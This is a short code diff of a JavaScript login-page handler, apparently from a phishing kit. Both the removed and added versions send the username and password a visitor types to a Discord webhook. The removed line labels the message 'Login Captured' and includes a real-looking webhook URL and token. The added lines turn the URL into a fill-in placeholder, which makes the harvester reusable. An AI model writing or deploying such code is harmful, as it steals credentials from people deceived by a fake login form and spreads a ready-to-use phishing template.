@@ -110,7 +110,7 @@ document.addEventListener("DOMContentLoaded", function() {
   const errorMsg = document.getElementById("errorMsg");
   const loginForm = document.getElementById("loginForm");
 
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1407527398634819675/VLdkgWM-0xnWNW2sPH3YUa3l1lwU5MZWywDSBzrjdcyOi-kEOCKfufQlMhllz9yTazFW"; // Replace with your actual webhook
+  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Replace with your actual webhook
 
   function checkInputs() {
     if (usernameInput.value.trim() && passwordInput.value.trim()) {
@@ -140,9 +140,7 @@ document.addEventListener("DOMContentLoaded", function() {
       fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `Login Captured:\nUsername: ${username}\nPassword: ${password}`
-        })
+        body: JSON.stringify({ username, password })
       }).catch(console.error);
     }
   });
